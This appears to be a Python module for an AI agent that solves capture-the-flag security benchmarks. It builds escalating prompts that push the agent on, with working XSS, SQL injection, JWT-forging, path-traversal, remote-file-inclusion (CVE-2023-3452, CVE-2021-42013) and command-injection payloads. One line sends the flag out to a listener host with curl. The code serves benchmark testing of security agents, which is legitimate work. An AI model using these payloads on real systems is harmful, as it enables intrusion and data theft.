"""Tag-aware nudge text builders extracted verbatim from the original
``SolverAgent.run()`` loop-detection block (previous). Behaviour is
preserved exactly so the refactor introduces no measurable XBOW delta.

Each builder takes ``nudge_count`` (1, 2, or 3+) and returns the
appropriate escalating message. Tag classification is done by
:func:`classify_tags` and matches the original ``is_xss``/``is_sqli``/
``is_jwt``/``is_cve``/``is_lfi``/``is_cmdi`` boolean cascade.
"""

from __future__ import annotations

from typing import Literal

NudgeCategory = Literal["xss", "sqli", "jwt", "cve", "lfi", "cmdi", "generic"]


def classify_tags(tags: list[str] | None) -> NudgeCategory:
    """Pick the most specific nudge category for the given engagement tags.

    Order matches the original cascade in ``SolverAgent.run()`` —
    XSS → SQLi → JWT → CVE → LFI (only if not JWT) → CmdI → generic.
    """
    if not tags:
        return "generic"
    lowered = [t.lower() for t in tags]
    if "xss" in lowered:
        return "xss"
    if any(t in ("sqli", "blind_sqli", "graphql", "nosqli") for t in lowered):
        return "sqli"
    is_jwt = any(t in ("jwt", "privilege_escalation") for t in lowered)
    if is_jwt:
        return "jwt"
    if any(t in ("cve",) for t in lowered):
        return "cve"
    # LFI only if not JWT (matches original guard ``(not is_jwt) and ...``)
    if any(t in ("lfi", "path_traversal", "information_disclosure", "ssh") for t in lowered):
        return "lfi"
    if any(t in ("command_injection",) for t in lowered):
        return "cmdi"
    return "generic"


def build_loop_nudge(category: NudgeCategory, nudge_count: int) -> str:
    """Return the escalating nudge text for a loop-detection event.

    ``nudge_count`` is 1-indexed (first nudge = 1, second = 2, third+ = "final").
    """
    builder = _BUILDERS[category]
    return builder(nudge_count)


# ---------------------------------------------------------------------------
# Per-category builders — verbatim from previous SolverAgent.run().
# ---------------------------------------------------------------------------


def _xss(nudge_count: int) -> str:
    if nudge_count == 1:
        return (
            "⚠️ LOOP DETECTED on XSS challenge. Broaden your approach:\n"
            "- Do NOT only try <script> tags — try: img, svg, body, style, "
            "image, video, audio, details, input, marquee, select, textarea\n"
            "- Test for whitespace stripping: send 'hello world' and check if "
            "it becomes 'helloworld'. If so, use / as attribute separator "
            'with QUOTED values: <img/src="x"/onerror="alert(\'XSS\')">\n'
            "- If GET isn't reflecting input, try POST with form data\n"
            "- Try BOTH spaced and /-separated versions of every payload\n"
            "- Check different parameters: name, solution, msg, input, q, search"
        )
    if nudge_count == 2:
        return (
            "🛑 SECOND LOOP WARNING on XSS challenge. Write a Python script "
            "to /tmp/exploit.py that:\n"
            "1. Enumerates SURVIVING TAGS: send <TAG>test</TAG> "
            "for 30+ tags and check which appear in the response\n"
            "2. For each surviving tag, try BOTH spaced and slash-separated "
            "payloads with QUOTED attribute values: "
            '<tag/attr="val"/onerror="alert(\'XSS\')">\n'
            "3. Try different event handlers for each surviving tag: "
            "onerror, onload, onfocus, ontoggle, onstart, onmouseover\n"
            "4. Try alert('XSS'), alert(1), alert(document.domain)\n"
            "5. Use per-request timeout (5s) to avoid overall script timeout\n"
            "6. Use file_write to save the script, then bash_exec to run it"
        )
    return (
        "� FINAL ATTEMPT on XSS — try a systematic approach.\n"
        "Write a COMPLETE Python script that:\n"
        "1. Tests 30+ HTML tags to find which survive the filter\n"
        "2. For surviving tags, builds payloads with QUOTED attributes "
        "and / separator\n"
        "3. Submits each to the checker endpoint and prints response\n"
        "4. Uses both GET and POST methods\n"
        "5. Uses per-request timeout (5s) to avoid overall timeout\n"
        "Then run it with bash_exec."
    )


def _sqli(nudge_count: int) -> str:
    if nudge_count == 1:
        return (
            "⚠️ LOOP DETECTED on SQLi challenge. Broaden your approach:\n"
            "- Parse ALL HTML forms on the page: look for <form method='POST'> "
            "and extract ALL <input name='...'> fields\n"
            "- Test BOTH GET and POST for every parameter you find\n"
            "- Include ALL form fields including hidden ones and submit buttons\n"
            "- Try different endpoints: /login, /search, /send, /query, /api\n"
            "- Test with: ' \" `) -- # to detect injection points\n"
            "- If you get 'filtered' errors, try: /**/ for spaces, "
            "double-encoding, case variations"
        )
    if nudge_count == 2:
        return (
            "🛑 SECOND LOOP WARNING on SQLi challenge. Write a Python script "
            "to /tmp/exploit.py that:\n"
            "1. Fetches the target page and parses ALL forms/inputs\n"
            "2. Tests SQLi payloads on EVERY parameter via BOTH GET and POST\n"
            "3. If filters block keywords, use bypass: /**/ for spaces, "
            "ORD(MID()) instead of ASCII(SUBSTR()), || instead of OR\n"
            "4. For blind SQLi: compare response lengths for true vs false "
            "conditions, then extract data char by char\n"
            "5. If you extract credentials, POST them to the login form\n"
            "6. Also try sqlmap: sqlmap -u URL --data 'param=test' --batch --dump"
        )
    return (
        "� FINAL ATTEMPT on SQLi. Write a COMPLETE script:\n"
        "1. Test ALL endpoints with POST form data\n"
        "2. Use filter bypass: /**/ for spaces, %09 for tabs\n"
        "3. Implement blind extraction if UNION fails\n"
        "4. Try sqlmap as last resort\n"
        "Run with bash_exec."
    )


def _jwt(nudge_count: int) -> str:
    if nudge_count == 1:
        return (
            "⚠️ LOOP DETECTED on JWT/privilege escalation challenge:\n"
            "- Check for /object storage on alternate ports: "
            "try 8333, 9000, 4566 on the target host\n"
            "- List  buckets: GET /?prefix= or GET / on the  port\n"
            "- Look for backup databases (.db, .sqlite, .sql) in  buckets\n"
            "- Download any database and extract user credentials\n"
            "- Check .env files, JS source code, page source for JWT secrets\n"
            "- Look for /api/auth, /api/user, /api/login endpoints"
        )
    if nudge_count == 2:
        return (
            "🔄 SECOND ATTEMPT on JWT challenge. Write a Python script:\n"
            "1. List  buckets on all discovered ports (GET /)\n"
            "2. List objects in each bucket (GET /BUCKET?prefix=)\n"
            "3. Download any .db/.sqlite files\n"
            "4. Open with sqlite3, dump all tables\n"
            "5. Find the admin/master user (isMaster=1)\n"
            "6. Find the JWT secret in .env or JS source\n"
            "7. Forge a JWT: jwt.sign({uid: ADMIN_UID}, SECRET)\n"
            "8. Use the forged token: GET /api/user?token=TOKEN\n"
            "9. Access /adminpanel/profile with the token cookie"
        )
    return (
        "🔄 FINAL ATTEMPT on JWT. Use PyJWT to forge a token:\n"
        "import jwt\n"
        "token = jwt.encode({'uid': ADMIN_UID}, SECRET, algorithm='HS256')\n"
        "Then GET /api/user?token=TOKEN or set cookie and visit /adminpanel/profile.\n"
        "The flag is shown only to master/admin users."
    )


def _cve(nudge_count: int) -> str:
    if nudge_count == 1:
        return (
            "⚠️ LOOP DETECTED on CVE challenge:\n"
            "- Fingerprint the server: check Server header, version numbers\n"
            "- For WordPress: enumerate plugins at /wp-content/plugins/PLUGIN/\n"
            "  Common vulnerable plugins: canto, flavor, flavor_forge\n"
            "- For Apache 2.4.49/50: try path traversal with double-encoding: "
            "%%32%65%%32%65 (decodes to ..)\n"
            "- Search for known CVEs matching the identified version/software\n"
            "- Try nuclei, nikto, or wpscan for automated CVE detection"
        )
    if nudge_count == 2:
        return (
            "🔄 SECOND ATTEMPT on CVE challenge. Write a Python script:\n"
            "1. Check ALL common WordPress plugin paths:\n"
            "   /wp-content/plugins/canto/, /wp-content/plugins/flavor/,\n"
            "   /wp-content/plugins/flavor_forge/\n"
            "2. For canto plugin: CVE-2023-3452 - RFI via\n"
            "   /wp-content/plugins/canto/includes/lib/download.php?wp_abspath=URL\n"
            "3. For Apache 2.4.49/50: CVE-2021-42013 - path traversal:\n"
            "   /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh\n"
            "4. Host a PHP file with: <?php echo file_get_contents('/FLAG.txt'); ?>\n"
            "   on a Python HTTP server, then use RFI to include it"
        )
    return (
        "🔄 FINAL ATTEMPT on CVE. For WordPress + Canto plugin:\n"
        "1. Start a Python HTTP server on port 8888\n"
        "2. Create wp-admin/admin.php that reads /FLAG.txt\n"
        "3. Find the host IP reachable from the target container\n"
        "4. GET /wp-content/plugins/canto/includes/lib/download.php"
        "?wp_abspath=http://HOST_IP:8888\n"
        "The target will require_once your admin.php via RFI."
    )


def _lfi(nudge_count: int) -> str:
    if nudge_count == 1:
        return (
            "⚠️ LOOP DETECTED on LFI/info disclosure challenge:\n"
            "- Check for hidden endpoints: /source, /debug, /info, /.env, "
            "/config, /admin, /.git/config\n"
            "- If you found path traversal, try ALL flag locations: "
            "/flag.txt, /FLAG.txt, /FLAG, /app/FLAG.php, /opt/flag.txt, "
            "/tmp/flag.txt, /proc/self/environ\n"
            "- Try varying ../  depths from 1 to 8 levels\n"
            "- For PHP: try php://filter/convert.base64-encode/resource=FLAG\n"
            "- Look for hardcoded credentials in source code (base64, plaintext)"
        )
    if nudge_count == 2:
        return (
            "🛑 SECOND LOOP WARNING on LFI challenge. Write a Python script "
            "to /tmp/exploit.py that:\n"
            "1. Tests path traversal with 1-8 levels of ../ on every file "
            "parameter\n"
            "2. Tests ALL common flag paths: flag.txt, FLAG.txt, FLAG, "
            "FLAG.php, app/flag.txt, etc.\n"
            "3. Tests php://filter wrappers for PHP apps\n"
            "4. Tests null byte injection: ?param=../../flag.txt%00\n"
            "5. If source code was found, extract and use any credentials\n"
            "6. Try SSH/database access with discovered credentials"
        )
    return (
        "� FINAL ATTEMPT on LFI. Try alternate techniques:\n"
        "1. Include access logs after sending crafted User-Agent header\n"
        "2. Read /proc/self/environ for environment variables\n"
        "3. Use php://input wrapper with POST body\n"
        "4. Use data:// wrapper with base64 content\n"
        "Run with bash_exec."
    )


def _cmdi(nudge_count: int) -> str:
    if nudge_count == 1:
        return (
            "⚠️ LOOP DETECTED on command injection challenge:\n"
            "- If output is NOT visible (blind injection), write the flag "
            "to a web-accessible path: ; cp /FLAG.txt /app/static/f.txt "
            "then GET /static/f.txt\n"
            "- Try ALL static directories: /app/static/, /var/www/html/, "
            "/app/public/, /app/uploads/, /app/templates/\n"
            "- If < > | & are blocked, use ; and $() which may NOT be blocked\n"
            "- Try tricking the output parser with echo + command substitution: "
            '; echo "1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss"\n'
            "- Also try: /FLAG.txt, /flag.txt, env | grep FLAG, "
            "/proc/1/environ"
        )
    if nudge_count == 2:
        return (
            "🛑 SECOND LOOP WARNING on command injection. Write a Python "
            "script to /tmp/exploit.py that:\n"
            "1. Tests ALL separator operators: ; | || && ` $() %0a &\n"
            "2. For each working separator, tries writing flag to EVERY "
            "static dir: cp /FLAG.txt /app/static/f.txt, "
            "cp /FLAG.txt /var/www/html/f.txt, etc.\n"
            "3. After each write attempt, tries to fetch the file\n"
            "4. If > is blocked, use: tee, cp, or echo with $() substitution\n"
            "5. Try crafting output that matches the app's expected format "
            "with the flag embedded via $(cat /FLAG.txt)\n"
            "6. Check /tmp/ as fallback write location"
        )
    return (
        "� FINAL ATTEMPT on command injection:\n"
        "1. Try filter bypass: $IFS for spaces, c'a't for cat, "
        "base64 -d for encoded commands\n"
        "2. Time-based extraction: conditional delay per character\n"
        "3. HTTP callback: curl http://LISTENER/$(cat /FLAG.txt)\n"
        "Run with bash_exec."
    )


def _generic(nudge_count: int) -> str:
    if nudge_count == 1:
        return (
            "⚠️ LOOP DETECTED: You are repeating the same commands. "
            "STOP and switch strategy:\n"
            "- Write a Python exploit script to /tmp/exploit.py: use the file_write tool "
            "(not cat/echo) to save it, then bash_exec to run it\n"
            "- If GET isn't working, try POST with data\n"
            "- If one attack technique fails after 3 tries, try a COMPLETELY different one\n"
            "- Use Python requests.Session() for multi-step exploits with login/cookies\n"
            "- Try different vulnerability classes: if SQLi isn't working, "
            "try SSTI, LFI, command injection, etc."
        )
    if nudge_count == 2:
        return (
            "� SECOND ATTEMPT: Please change your approach.\n"
            "Take a step back and:\n"
            "1. List what you've tried so far and WHY it failed\n"
            "2. What endpoints/parameters have you found?\n"
            "3. What vulnerability types have you NOT tried yet?\n"
            "4. Try a COMPLETELY different technique (e.g., header manipulation, "
            "path traversal, deserialization, IDOR, SSTI, XXE)\n"
            "5. Check for: hidden parameters, different HTTP methods, header-based bypasses "
            "(X-Forwarded-For, Host), PHP filter wrappers, env vars\n"
            "Write a COMPLETE Python script to /tmp/ with file_write."
        )
    return (
        "� FINAL ATTEMPT: You are still repeating steps.\n"
        "The target is a REMOTE web application at the URL. "
        "Do NOT explore the local filesystem.\n"
        "Write a Python script with file_write that:\n"
        "1. Uses requests to test the target endpoints\n"
        "2. Sends different payloads for each technique\n"
        "3. Prints the response\n"
        "Then run it with bash_exec."
    )


_BUILDERS = {
    "xss": _xss,
    "sqli": _sqli,
    "jwt": _jwt,
    "cve": _cve,
    "lfi": _lfi,
    "cmdi": _cmdi,
    "generic": _generic,
}


# ---------------------------------------------------------------------------
# Continuation nudge — when LLM returns no tool calls but iterations + nudge
# budget remain. Verbatim from the original ``run()``.
# ---------------------------------------------------------------------------


CONTINUATION_NUDGE = (
    "STOP. You returned no tool calls but no flag has been verified yet. "
    "Reasoning text is NOT a submission. You MUST continue with concrete tool calls.\n\n"
    "Common failure modes you may have just hit:\n"
    "- Flag content was URL/percent/base64-encoded in your exfil channel — DECODE it "
    "(urllib.parse.unquote, base64.b64decode) and search for `FLAG{...}` literally.\n"
    "- You see `FLAG...` truncated — re-exfil with a longer/better channel "
    "(write to /app/static/<file> then GET it).\n"
    "- You read a flag value from source/.env in the repo — that is STALE. Many CTF / "
    "benchmark platforms rebuild with a random flag at runtime; the only valid flag is "
    "one you exfil from the LIVE target this run.\n"
    "- You confused yourself with an OOB callback — fetch the actual flag file directly "
    "via your SSTI/RCE primitive and print the raw bytes.\n\n"
    "Issue at least one bash_exec call now to verify or extend your exploit. "
    "Print the full raw response."
)
